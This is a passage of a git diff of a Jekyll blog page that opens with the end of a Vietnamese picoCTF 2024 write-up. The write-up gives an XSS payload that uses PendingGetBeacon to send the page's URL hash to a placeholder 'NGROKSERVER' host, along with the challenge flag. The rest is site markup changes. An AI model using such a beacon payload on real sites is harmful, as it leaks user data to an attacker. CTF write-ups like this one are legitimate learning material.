[&quot;Fire&quot;, &quot;Sand&quot;], [&quot;Artificial Intelligence&quot;, &quot;Data&quot;], [&quot;Computer Chip&quot;, &quot;Software&quot;], [&quot;Air&quot;, &quot;Rock&quot;], [&quot;Glass&quot;, &quot;Software&quot;], [&quot;Encryption&quot;, &quot;Software&quot;], [&quot;Internet&quot;, &quot;Program&quot;], [&quot;Cybersecurity&quot;, &quot;Vulnerability&quot;], [&quot;Exploit&quot;, &quot;Web Design&quot;]], &quot;xss&quot;: &quot;new PendingGetBeacon(&#39;https://NGROKSERVER/xxxx/?yuu=&#39; + window.location.hash.slice(1), {timeout: 1000});&quot;} Sau khoảng 1s sẽ nhận được một request đến server của ta Decode và lấy flag Flag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} Fun fact: Bài này sau khi mình hết cứu thì mình đã thực hiện phương thức random bullshit go và bị người anh pro của mình nhắc nhở :&quot;(( may mà không có cái payload nào hack máy mình, hehe cảm ơn anh đã nhắc nhở Lời bạt: Sau giải thì mình cũng học được thêm rất nhiều thứ và được cùng team chơi giải này, mong sau này team mình đạt được thứ hạng cao hơn. Cảm ơn ae (Hidori, Kuro0, fuyosuru, SinsAries) Nguồn Writeup: https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024","headline":"PicoCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/PicoCTF2024/"},"url":"http://localhost:4000/posts/PicoCTF2024/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -2017,7 +2017,7 @@
 
 <time
   
-  data-ts="1711612129"
+  data-ts="1711623443"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
@@ -2747,7 +2747,7 @@ Additional details will be available after launching your challenge instance.
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
+          <a href="/posts/GreyCTF/">GreyCTF 2024</a>
         </li>
       
         
@@ -2755,6 +2755,13 @@ Additional details will be available after launching your challenge instance.
         
         <li class="text-truncate lh-lg">
           <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
         </li>
       
         
@@ -2827,10 +2834,11 @@ Additional details will be available after launching your challenge instance.
     
     
     
-      
-        
-        
-
+  
+    
+    
+    
+    
   
     
     
@@ -2846,23 +2854,9 @@ Additional details will be available after launching your challenge instance.
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -2899,23 +2893,9 @@ Additional details will be available after launching your challenge instance.
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -2980,6 +2960,43 @@ Additional details will be available after launching your challenge instance.
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2990,6 +3007,129 @@ Additional details will be available after launching your challenge instance.
         
         
 
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
   
     
     
@@ -3059,7 +3199,13 @@ Additional details will be available after launching your challenge instance.
         <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
@@ -3125,6 +3271,18 @@ Additional details will be available after launching your challenge instance.
 
 
 
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
   
 
@@ -3306,9 +3464,13 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
   
 
   
-    <div class="btn btn-outline-primary disabled" aria-label="Newer">
-      <p>-</p>
-    </div>
+    <a
+      href="/posts/GreyCTF/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>GreyCTF 2024</p>
+    </a>
   
 </nav>
 
@@ -3414,10 +3576,11 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
     
     
     
-      
-        
-        
-
+  
+    
+    
+    
+    
   
     
     
@@ -3433,23 +3596,9 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -3486,23 +3635,9 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -3567,6 +3702,43 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -3577,6 +3749,129 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
         
         
 
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
   
     
     
@@ -3646,7 +3941,13 @@ Chức năng login bắt chúng ta post data lên và server sẽ trả lại m�
         <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
